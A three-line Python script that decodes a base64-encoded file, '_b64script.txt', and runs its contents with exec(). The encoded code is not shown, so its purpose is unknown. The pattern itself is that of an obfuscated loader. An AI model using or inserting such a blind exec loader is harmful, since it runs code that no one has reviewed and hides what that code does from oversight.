import base64, pathlib
script = base64.b64decode(pathlib.Path('_b64script.txt').read_text()).decode()
exec(script)